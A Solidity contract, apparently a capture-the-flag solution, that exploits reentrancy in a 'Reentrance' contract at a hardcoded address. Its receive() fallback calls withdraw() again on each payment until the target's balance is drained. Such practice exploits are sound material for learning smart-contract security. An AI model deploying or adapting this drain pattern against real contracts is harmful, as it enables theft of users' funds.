// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Reentrancy.sol";

contract MySolution {
  Reentrance immutable myContract = Reentrance(payable(0x524F04724632eED237cbA3c37272e018b3A7967e));

  constructor() payable {}
  function run() external {
    myContract.donate{ value: 0.001 ether}(address(this));
    myContract.withdraw(0.001 ether);
  }

  receive() external payable {
    if (address(myContract).balance > 0) {
      myContract.withdraw(0.001 ether);
    }
  } 
}
